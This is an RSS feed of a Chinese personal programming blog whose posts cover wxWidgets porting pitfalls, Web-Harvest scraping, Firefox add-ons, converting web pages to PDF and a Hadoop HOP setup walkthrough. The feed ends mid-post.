<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Goorockey's Blog</title><link>http://www.goorockey.com/</link><description></description><atom:link href="http://www.goorockey.com/feeds/goorockey.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 21 Apr 2014 10:41:00 +0800</lastBuildDate><item><title>用wxWidgets做移植的总结</title><link>http://www.goorockey.com/blog/2014/04/21/yong-wxwidgetszuo-yi-zhi-de-zong-jie/</link><description>
&lt;p&gt; 这几个月做的项目是把一个承载在 MFC 的软件从 Windows 移植到 Mac，现在进入最后验收阶段了。当时网上调研了一下，决定用 &lt;a href="http://www.wxwidgets.org" title="wxWidgets"&gt;wxWidgets&lt;/a&gt; 这个跨平台的开源库来帮助移植。总的来说，只要把原软件对 Windows API 的调用都改为对 wxWidgets 的调用，基本就完成了移植。但基于 wxWidgets 和 MFC 一些设计上的差异和原软件特殊的功能，还不是简单的全局替换就能了事的，甚至还得改 wxWidgets 的源码。&lt;/p&gt;
&lt;p&gt;wxWidgets 库在总的结构上跟 MFC 相似，比如消息响应、相关类的命名。它现在已经出到了 3.0，总体还是比较成熟了，但还是好些不完善的地方，这个在看它源码的时候就会发现挺多 TODO comment。不过它的官方论坛和 stackoverflow 上相关问题还是挺活跃的，在上面提问很快就能得到一些资深程序员的答复。有一次我误以为发现了它的一个 bug（其实是我理解错了），在上面提问，回复的人不仅有文字的讲解，还附上了自己写的测试用例，让我真心赞叹对方好负责任啊。&lt;/p&gt;
&lt;p&gt; 现在总结一些项目移植过程中遇到的问题吧。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="wxrectcrect"&gt;wxRect 和 CRect&lt;/h2&gt;
&lt;p&gt;Windows 的 CRect 要替换成 wxWidgets 的 wxRect 真不能简单的替换，因为两者内部设计不一样。&lt;/p&gt;
&lt;p&gt; 第一，两者对应接口的入参有不同，最经典的是两者的构造函数，CRect 是传 left,top,right,bottom，wxWidgets 是传 left,top,width,height，等于说所有构造 CRect 的地方都要把第三、第四个参数做减法。&lt;/p&gt;
&lt;p&gt; 第二，wxRect 定义自己所表示的矩形，范围是 [left, right - 1] 和 [top, bottom - 1]，意思就是右边界和下边界是不属于矩形一部分的，这个从其源码能看到。官方说法是不承认 width 或 height 为 1 的矩形，那应该视为线段。这在移植一些矩形操作时，会跟 CRect 的有些差异。&lt;/p&gt;
&lt;p&gt; 第三，也是我觉得最坑的，CRect 内部直接保存 left,top,right,bottom 来定义矩形，而 wxRect 内部保存 left,top,width,height 来定义矩形，即 wxWidgets 要 GetRight 的时候，是返回 left + width，SetRight 的时候 set 的是 width，其他的同理。这看着没什么问题。但如果我们先 SetRight，再 SetLeft，wxRect 的行为就跟 CRect 的不一样了。&lt;/p&gt;
&lt;p&gt; 例如对一个 (left,top,right,bottom)=(1,1,5,5) 的 CRect，对应的 wxRect 是 (left,top,width,height)=(1,1,4,4)，我们对其依次执行 SetRight(10) 和 SetLeft(3)，得到 CRect 是 (left,top,right,bottom)=(3,1,10,5)，wxRect 是 (left,top,width,height)=(3,1,9,4)，换算过来 wxRect 是 (left,top,right,bottom)=(3,1,12,5)，跟得到的 CRect 不同！原因就是 SetLeft 的时候，wxRect 只改 left，没改 width，但等于 right 还是改了，其实是使整个矩形做了偏移；CRect 的行为则是修改左边界，右边界不会动，其实是使整个矩形做压缩。真是坑啊！注意到这一点之后，原软件每个连续 SetLeft、SetRight，SetTop、SetBottom 的地方，都要注意执行的顺序。&lt;/p&gt;
&lt;p&gt; 鉴于 wxRect 和 CRect 以上的差异，其实移植的时候最好的做法是自己写一个封装了 wxRect 的 MyRect 类，把 wxRect 和 CRect 的差异在 MyRect 里面做转换。这其实是应用了 Adaptor Pattern。&lt;/p&gt;
&lt;h2 id="macwxbitmapwxclipboardalpha"&gt;Mac 下 wxBitmap 在剪切板 wxClipboard 取回时，Alpha 信息丢失 &lt;/h2&gt;
&lt;p&gt;wxWidgets 在从剪切板 wxClipboard 取回图片数据 wxBitmapDataObject 时，会丢失了透明信息，即 Alpha channel。具体来看就是原来用 RGBA 表示的有透明信息的图片，通过剪切板传递之后，RGBA 的 A 都变成 255 了。&lt;/p&gt;
&lt;p&gt; 我通过查看 wxWidgets 的源码，发现确实是个 bug，wxWidgets 在 Mac 这边调用 Cocoa 接口从剪切板获取像素数据保存为图片时，没有关注 Alpha channel。这个我通过修改它源码解决了。详见我提交到官方的这个 &lt;a href="http://trac.wxwidgets.org/ticket/16198"&gt;ticket&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id="wxdcunix"&gt;wxDC 在 Unix 下不是线程安全的 &lt;/h2&gt;
&lt;p&gt;wxDC 是 wxWidgets 的绘制上下文，对应于 Windows 下的 CDC。官方资料说了，wxDC 在 Unix 平台下是非线程安全的。这里指的 Unix 平台具体是 GTK(Linux) 和 OSX(Mac)。所以绘制的时候最好是下 wxPaintEvent 的响应函数里面做。在子线程做绘制不保证正确，即使是用 wxWidgets 的 wxGuiEnter/wxGuiLeave 加锁也是不行。&lt;/p&gt;
&lt;h2 id="_1"&gt; 对话框资源的移植 &lt;/h2&gt;
&lt;p&gt; 在 MFC 中，对话框资源都保存在 rc 文件中。而对应到 wxWidgets，每个对话框以 xml 格式保存成各自的 xrc 文件，跟 rc 有一定区别。MFC 大部分控件在 wxWidgets 都能找到。对于对话框资源的移植，我们是用脚本批量完成的，中间一个坑是转换时候对话框和控件的大小在 MFC 的 rc 和 wxWidgets 的 xrc 不是 1:1 的，要乘一个比例，1.5 左右。&lt;/p&gt;
&lt;h2 id="all-in-all"&gt;ALL IN ALL&lt;/h2&gt;
&lt;p&gt; 以上是暂时记得的问题。总的来说，wxWidgets 是个强大的跨平台库，用着真心方便，常用的操作也都覆盖了，代码也整洁漂亮，社区也活跃，还是可以放心选用的。而且作为一个开源库，有什么问题都能自己定位自己修改解决，开源万岁～&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 21 Apr 2014 10:41:00 +0800</pubDate><guid>tag:www.goorockey.com,2014-04-21:blog/2014/04/21/yong-wxwidgetszuo-yi-zhi-de-zong-jie/</guid><category>programming</category><category>wxwidgets</category><category>cpp</category></item><item><title>用Web-Harvest抓腾讯微博</title><link>http://www.goorockey.com/blog/2014/03/05/yong-web-harvestzhua-teng-xun-wei-bo/</link><description>
&lt;p&gt; 好久没更新博客，水一文。&lt;/p&gt;
&lt;p&gt; 前阵子要给别人出试题，偶然发现 &lt;a href=" 下称 WH"&gt;Web-Harvest&lt;/a&gt; 这个抓网页的工具，它主要应用 xpath 和 xquery 抓网页，内置还定义了一套功能挺多的语法，就出了一道用 WH 抓微博的题目。&lt;/p&gt;
&lt;p&gt; 本来想抓新浪微博的，但发现它的微博内容都是 js 生成的，折腾了一下，还是可以用 WH 的函数提取出内容，但腾讯微博相对还是简单多了。&lt;/p&gt;
&lt;p&gt; 题目其中一个内容是用 WH 抓几页邓紫棋的腾讯微博，排除包含她演唱会广告的和没有图片的微博。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt; 其中遇到的坑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 因为是包含中文，写入到文件时要用 gbk 编码 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 在 xpath 已经用 li[@id] 获取微博节点，但节点传到 xquery 里面时竟然还要再一次用 li[@id] 获取一级 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 配置文件如下 &lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/9368146.js"&gt;&lt;/script&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Wed, 05 Mar 2014 21:31:00 +0800</pubDate><guid>tag:www.goorockey.com,2014-03-05:blog/2014/03/05/yong-web-harvestzhua-teng-xun-wei-bo/</guid><category>programming</category><category>Web-Harvest</category></item><item><title>我的firefox</title><link>http://www.goorockey.com/blog/2013/09/08/wo-de-firefox/</link><description>
&lt;p&gt; 好久好久没有更新 blog 了，markdown 怎么用都忘了。。写 blog 总结还是很有用的。今天写一下答应过某人写自己 firefox 的状况。&lt;/p&gt;
&lt;h2 id="_1"&gt; 使用感受 &lt;/h2&gt;
&lt;p&gt; 主流的浏览器都用过，坚持用 firefox 的原因主要是因为 &lt;a href="http://www.vimperator.org" title="vimperator"&gt;vimperator&lt;/a&gt;，纯键盘地上网很 cool 很快捷，而且我用的时候会把地址栏、add-on bar 等等都去掉，最大化可视范围。 
虽然现在 firefox 在内存、响应速度上还是比不上 chrome，但谁叫 chrome 的 vim 化插件不好用呢～&lt;/p&gt;
&lt;p&gt; 另外用 firefox 写 web 的时候也比较方便，现在自带的 “Responsive Design View" 很方便地调试移动端的 web 体验。firefox 每次升级都会有针对 developer 的 new feature，足以看出它很重视开发者的功能。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="_2"&gt; 插件 &lt;/h2&gt;
&lt;p&gt; 装插件折腾自己的 firefox 是必须的。当我看到有的人用 firefox 基本就是原装的，我都觉得他不适合用 firefox，倒不如用另外国产标配好的浏览器让自己用得舒服一点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;vimperator&lt;/strong&gt;    神器 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;firebug&lt;/strong&gt;   神器 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;greasemonkey&lt;/strong&gt;  神器，firefox 插件的扩展 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;adblock plus&lt;/strong&gt;  去广告 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;All-in-One Sidebar&lt;/strong&gt;    侧边栏管理插件，下载等等 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AutoPager&lt;/strong&gt; 自动加载下一页 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AutoProxy&lt;/strong&gt; 科学上网 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DownThemAll&lt;/strong&gt; 下载管理 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;feedly&lt;/strong&gt;  rss reader&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flashblock&lt;/strong&gt; 默认禁止页面的 flash，加快加载，页面体验也爽些 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;https finder&lt;/strong&gt; 如果网页支持 https，会自动用 https&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;instasaver&lt;/strong&gt; instapaper 的插件 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;lastpass&lt;/strong&gt; 密码管理 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;memroy fox&lt;/strong&gt; 优化 firefox 的内存 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;quickdrag&lt;/strong&gt; 鼠标拖拽 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;refcontrol&lt;/strong&gt; 修改 refer，破防盗链 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;stumbleupon&lt;/strong&gt; 发现好网站、消磨时间必备神器 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;tab mix plus&lt;/strong&gt; 标签管理 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;weibo_wc&lt;/strong&gt;  重新定制新浪微博的样式，很整洁舒服 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;wiktionary and google translate&lt;/strong&gt; 翻译 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;wiznote web clipper&lt;/strong&gt; 为知插件 &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_3"&gt; 其他 &lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt; 主页设成空白页，这样每次打开都是自己主动获取信息，而不会在 “ 自己以为有用的网站 “ 上浪费时间和精力 &lt;/li&gt;
&lt;li&gt;autoproxy+&lt;a href="https://code.google.com/p/greatagent" title="greatagent"&gt;greatagent&lt;/a&gt;，配合 https，科学上网 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 暂时就写到这吧～&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sun, 08 Sep 2013 01:18:00 +0800</pubDate><guid>tag:www.goorockey.com,2013-09-08:blog/2013/09/08/wo-de-firefox/</guid><category>firefox</category></item><item><title>抓网页保存为pdf</title><link>http://www.goorockey.com/blog/2012/10/29/zhua-wang-ye-bao-cun-wei-pdf/</link><description>
&lt;p&gt; 最近在刷题，总想把题目保存下来，这样没网的时候也可以做题，放手机里也可以随时做了。所以就想着把题目抓下来保存为比较通用的 pdf 了。&lt;/p&gt;
&lt;p&gt; 一开始想的是先做类似整站下载，把文字和图片都抓下来，然后再做 html 转 pdf。自己写工具抓下来的话，要抓图片、修改网页里面图片的链接，昨天调研了一下，没找到用 python 有什么方便的办法，就放弃这条路了。&lt;/p&gt;
&lt;p&gt; 今天突然找到，网上还是有很多直接网页保存为 pdf 的工具、网站的。最方便、强大的要数 &lt;a href="http://pdfmyrul" title="pdfmyurl"&gt;pdfmyurl&lt;/a&gt; 了。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="pdfmyurl"&gt;pdfmyurl&lt;/h2&gt;
&lt;p&gt; 可以通过 http://pdfmyurl.com?url=\&amp;lt;siteurl&amp;gt; , 来把指定链接的网页保存为 pdf，而且是直接返回的，即用 wget http://pdfmyurl.com?url=\&amp;lt;siteurl&amp;gt; 就可以直接得到所需的 pdf，不用再按什么按钮之类的了。&lt;/p&gt;
&lt;p&gt; 在官网上可以发现，pdfmyurl 可以算是个 api 服务，可以通过传很多 get 参数来得到需要的 pdf 结果。比较常用的有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;--filename    输出的 pdf 文件名 &lt;/li&gt;
&lt;li&gt;--page-size   页面大小，默认是 A4&lt;/li&gt;
&lt;li&gt;--proxy       通过制定的代理访问该页面，--username --password 还指定用户和密码 &lt;/li&gt;
&lt;li&gt;-b            使得到的 pdf 有目录、书签、页眉等书的样式，不过目录不咋地 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pdfmyurl 已经很强大了，但每次只能完成一个网面的 pdf，所以还得想办法做 pdf 的合并。&lt;/p&gt;
&lt;h2 id="pdftk"&gt;pdftk&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/" title="pdftk"&gt;pdftk&lt;/a&gt; 也是一个 pdf 方面的神奇，可以完成 pdf 合并、合并多个 pdf 指定页、分割、加水印等，而且是跨 windows、linux、mac 多个平台的。不过我也只用来合并 pdf:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;pdftk&lt;/span&gt; &lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="n"&gt;pdf&lt;/span&gt; &lt;span class="mf"&gt;2.&lt;/span&gt;&lt;span class="n"&gt;pdf&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="mf"&gt;12.&lt;/span&gt;&lt;span class="n"&gt;pdf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 但弄出来的 pdf 是没有目录的。&lt;/p&gt;
&lt;p&gt; 所以更好的办法其实是用更强大的 latex。不过 latex 还有待系统地研究，现在的再写个 bash 就已经满足我 90% 的要求了～&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt; 更新：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt; 今天还是发现了一个用 python 抓 oj 的，有空参考一下，自己实现一个。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 今天还发现，pdfmyurl 似乎对单个 ip 一定时间内的请求做了限制，超过限制后，请求都会返回一个错误信息的 pdf。我就借 cjb 的 tor 解决了这个问题（又用 tor 干了邪恶的事了）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 29 Oct 2012 23:46:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-10-29:blog/2012/10/29/zhua-wang-ye-bao-cun-wei-pdf/</guid><category>others</category><category>pdf</category></item><item><title>玩一下hadoop</title><link>http://www.goorockey.com/blog/2012/10/21/wan-xia-hadoop/</link><description>
&lt;p&gt; 由于某种原因，今天玩了一下 &lt;a href="http://hadoop.apache.org/" title="Hadoop"&gt;Hadoop&lt;/a&gt;。正确来说，我是玩 &lt;a href="http://code.google.com/p/hop/" title="HOP"&gt;HOP&lt;/a&gt;，一个 Hadoop 的修改版本。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Hadoop Online Prototype (HOP) is a modified version of Hadoop MapReduce that allows data to be pipelined between tasks and between jobs. This can enable better cluster utilization and increased parallelism, and allows new functionality: online aggregation (approximate answers as a job runs), and stream processing (MapReduce jobs that run continuously, processing new data as it arrives). &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 就是多了 pipeline（流水线）的 Hadoop。分布式流水线可以有效加快各 jobs 在各节点的同步运算。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="_1"&gt; 准备 &lt;/h2&gt;
&lt;p&gt; 我是在 linux 上弄的，windows 下用 cygwin 也行。&lt;/p&gt;
&lt;p&gt; 下载 HOP 压缩包后，看里面的 docs 就够了，同时 src/example 还有一些例子。&lt;/p&gt;
&lt;p&gt; 确保 ssh,sshd,rsync,jdk 都有了。同时要保证 ssh localhost 不要输入密码的认证步骤。具体 docs/quickstart 也有说，可以这样：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;keygen&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;dsa&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;P&lt;/span&gt; &lt;span class="err"&gt;''&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_dsa&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_dsa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pub&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 然后是设置 jdk 的目录，修改 conf/hadoop-env.sh 中 JAVA_HOME。一般为 /usr/lib/jvm/ 下的某个 java 目录，我就直接写成 /usr/lib/jvm/default-java 了。&lt;/p&gt;
&lt;p&gt; 这时候执行 bin/hadoop 就会出现帮助信息了。&lt;/p&gt;
&lt;h2 id="_2"&gt; 跑例程 &lt;/h2&gt;
&lt;p&gt;Hadoop 的文件系统叫 &lt;a href="http://hadoop.apache.org/docs/stable/hdfs_design.html" title="HDFS"&gt;HDFS&lt;/a&gt;（Hadoop distribution filesystem)，是一个分布式文件系统。每份数据都会在多个节点有备份，以容错、修复。所有数据都要先放进 HDFS 才能 Hadoop 处理。&lt;/p&gt;
&lt;p&gt;Hadoop 的分布式体系中，有一个 NameNode，是 master 的角色，负责主控各节点，有多个 DataNode，是 slave，负责真正存储数据。这些可以在 conf/master 和 conf/slave 设置。
同时还有一个 JobTracker，负责调度 jobs，默认就是 NameNode 这个主机一起充当 NameNode，这个在 conf/hadoop-site.xml 设置。另外所有 DataNode 都是 TaskTracker，负责执行 jobs。具体更多对 conf/hadoop-site.xml 的配置参看 docs/cluster_setup.html&lt;/p&gt;
&lt;p&gt; 执行 bin/hadoop namenode -format，会创造一个 namenode。文件都已某种格式放在 /tmp/hadoop-"hostname" 那里。&lt;/p&gt;
&lt;p&gt; 执行 bin/start-all.sh 会启动 hadoop，默认通过 http://localhost:50070/ 可以访问 NameNode，http://localhost:50030/ 可以访问 JobTracker。&lt;/p&gt;
&lt;p&gt; 现在执行一个例子 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;

&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt; &lt;span class="n"&gt;intput&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;   &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 把当前文件系统 &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="err"&gt; 目录复制为 &lt;/span&gt;&lt;span class="n"&gt;HDFS&lt;/span&gt;&lt;span class="err"&gt; 的 &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="n"&gt;hadoop&lt;/span&gt;&lt;span class="o"&gt;-*-&lt;/span&gt;&lt;span class="n"&gt;examples&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;dfs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;.]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 执行所有 &lt;/span&gt;&lt;span class="n"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="err"&gt;，后面的是参数 &lt;/span&gt;

&lt;span class="cp"&gt;# 一段时间后，执行完毕 #&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 把 &lt;/span&gt;&lt;span class="n"&gt;HDFS&lt;/span&gt;&lt;span class="err"&gt; 中的 &lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="err"&gt; 目录复制为当前文件系统的 &lt;/span&gt;&lt;span class="n"&gt;ouput&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 打印结果 &lt;/span&gt;

&lt;span class="cp"&gt;# 或者直接对 HDFS 操作 #&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="wordcount"&gt;WordCount 例子 &lt;/h2&gt;
&lt;p&gt;&lt;a href="http://hadoop.apache.org/docs/stable/mapred_tutorial.html" title="WordCount"&gt;WordCount&lt;/a&gt; 是 hadoop 中的另一个例子 &lt;/p&gt;
&lt;p&gt;Hadoop 是通过 &lt;a href="http://wiki.apache.org/hadoop/HadoopMapReduce" title="MapReduce"&gt;MapReduce&lt;/a&gt; 机制来处理大数据的。Map 阶段分割输入的数据，并整合成 \&amp;lt;key,value&amp;gt; 的对应关系。每对 \&amp;lt;key,value&amp;gt; 对送到 Combiner 做每个 key 的整合，当整合出一定数量的 \&amp;lt;key,value&amp;gt; 后，\&amp;lt;key,value&amp;gt; 会送到 Reducer 做处理输出最终的 \&amp;lt;key,value&amp;gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;k1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;map&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;k2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;combine&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;k2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;reduce&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;k3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 按照 &lt;a href="http://hadoop.apache.org/docs/stable/mapred_tutorial.html" title="WordCount"&gt;WordCount&lt;/a&gt; 中的代码编辑 WordCount.java，然后编译打包生成 wordcount.jar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="n"&gt;wordcount_classes&lt;/span&gt;
